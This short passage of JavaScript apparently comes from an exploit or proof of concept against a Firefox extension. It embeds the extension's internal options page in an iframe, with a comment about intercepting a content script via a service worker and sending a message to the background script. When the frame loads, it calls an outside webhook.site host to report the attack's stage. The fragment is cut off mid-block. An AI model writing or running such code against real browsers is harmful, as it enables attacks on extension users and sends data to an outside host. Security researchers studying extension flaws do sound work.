      // Give cs.js enough time to run, intercept via SW, and send updateLastUrl to background.js

      iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
      document.body.appendChild(iframe);

      iframe.onload = () => {

        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=redirecting_to_target');
